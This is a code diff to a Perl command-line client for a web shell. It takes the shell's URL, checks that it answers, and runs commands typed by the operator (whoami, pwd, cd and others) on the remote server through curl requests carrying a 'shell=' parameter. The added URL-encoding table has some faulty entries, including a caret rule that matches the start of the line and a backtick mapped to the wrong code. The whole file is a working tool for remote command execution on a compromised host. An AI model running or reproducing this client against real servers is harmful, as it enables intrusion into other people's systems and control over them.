@@ -31,6 +31,7 @@ use strict;
 our $pwd; #working directory variable 
 our $loc; #web address of web shell
 our $user; #user being used to run commands
+our $curl; #curl+options+$loc+shell
 $SIG{INT} = \&ctrlc; #defines control-C action
 
 ############################
@@ -57,7 +58,7 @@ sub StripTags{
 ############################
 sub cd{
 	my $input = $_[0];
-	$pwd = `curl -s $loc?shell=cd%20$pwd%3B$input%3Bpwd`;
+	$pwd = `$curl=cd%20$pwd%3B$input%3Bpwd`;
 	StripTags($pwd);
 	$pwd =~ s/^\s+|\s+$//g;	
 }
@@ -99,6 +100,65 @@ sub URLEncode{
         $_[0] =~ s/A/%41/g;
         $_[0] =~ s/B/%42/g;
         $_[0] =~ s/C/%43/g;
+        $_[0] =~ s/D/%44/g;
+        $_[0] =~ s/E/%45/g;
+        $_[0] =~ s/F/%46/g;
+        $_[0] =~ s/G/%47/g;
+        $_[0] =~ s/H/%48/g;
+        $_[0] =~ s/I/%49/g;
+        $_[0] =~ s/J/%4A/g;
+        $_[0] =~ s/K/%4B/g;
+        $_[0] =~ s/L/%4C/g;
+        $_[0] =~ s/M/%4D/g;
+        $_[0] =~ s/N/%4E/g;
+        $_[0] =~ s/O/%4F/g;
+        $_[0] =~ s/P/%50/g;
+        $_[0] =~ s/Q/%51/g;
+        $_[0] =~ s/R/%52/g;
+        $_[0] =~ s/S/%53/g;
+        $_[0] =~ s/T/%54/g;
+        $_[0] =~ s/U/%55/g;
+        $_[0] =~ s/V/%56/g;
+        $_[0] =~ s/W/%57/g;
+        $_[0] =~ s/X/%58/g;
+        $_[0] =~ s/Y/%59/g;
+        $_[0] =~ s/Z/%5A/g;
+        $_[0] =~ s/\[/%5B/g;
+        $_[0] =~ s/\\/%5C/g;
+        $_[0] =~ s/\]/%5D/g;
+        $_[0] =~ s/^/%5E/g;
+        $_[0] =~ s/_/%5F/g;
+        $_[0] =~ s/a/%61/g;
+        $_[0] =~ s/b/%62/g;
+        $_[0] =~ s/c/%63/g;
+        $_[0] =~ s/d/%64/g;
+        $_[0] =~ s/e/%65/g;
+        $_[0] =~ s/f/%66/g;
+        $_[0] =~ s/g/%67/g;
+        $_[0] =~ s/h/%68/g;
+        $_[0] =~ s/i/%69/g;
+        $_[0] =~ s/j/%6A/g;
+        $_[0] =~ s/k/%6B/g;
+        $_[0] =~ s/l/%6C/g;
+        $_[0] =~ s/m/%6D/g;
+        $_[0] =~ s/n/%6E/g;
+        $_[0] =~ s/o/%6F/g;
+        $_[0] =~ s/p/%70/g;
+        $_[0] =~ s/q/%71/g;
+        $_[0] =~ s/r/%72/g;
+        $_[0] =~ s/s/%73/g;
+        $_[0] =~ s/t/%74/g;
+        $_[0] =~ s/u/%75/g;
+        $_[0] =~ s/v/%76/g;
+        $_[0] =~ s/w/%77/g;
+        $_[0] =~ s/x/%78/g;
+        $_[0] =~ s/y/%79/g;
+        $_[0] =~ s/z/%7A/g;
+        $_[0] =~ s/{/%7B/g;
+        $_[0] =~ s/\|/%7C/g;
+        $_[0] =~ s/}/%7D/g;
+        $_[0] =~ s/~/%7E/g;
+        $_[0] =~ s/`/%80/g;
 }
 
 ############################
@@ -129,6 +189,7 @@ sub shell{
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
+        #URLEncode($input);
 	foreach my $cmd (@parts){
 		if ($cmd =~ m/cd \S+/){
 			$cmd =~ s/ /%20/g;
@@ -136,7 +197,7 @@ sub shell{
 		}
 	}
 
-	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input%202%3E%261`); #runs command and captures output
+	chomp(my $output = `$curl=cd%20$pwd%3B$input%202%3E%261`); #runs command and captures output
 	#clean up output
 	StripTags($output,1);
 	chomp($output);
@@ -150,7 +211,9 @@ sub shell{
 #prompt for, get, and check for existence of a web shell at the user spcified address.
 print "Address of shell: ";
 chomp($loc = <STDIN>);
-if (`curl -s $loc?shell=echo%20index.php` =~ m/index\.php/){
+#set up $curl variable
+$curl = "curl -s $loc?shell";
+if (`$curl=echo%20index.php` =~ m/index\.php/){
 	print "Shell found!\n";
 }else{
 	print "Shell not found!\n";
@@ -158,10 +221,10 @@ if (`curl -s $loc?shell=echo%20index.php` =~ m/index\.php/){
 }
 
 #get current user and working dir for the prompt
-$user = `curl -s $loc?shell=whoami`;
+$user = `$curl=whoami`;
 StripTags($user);
 chomp($user);
-$pwd = `curl -s $loc?shell=pwd`;
+$pwd = `$curl=pwd`;
 StripTags($pwd);
 chomp($pwd);
 $user =~ s/\s+$|^\s+//g;
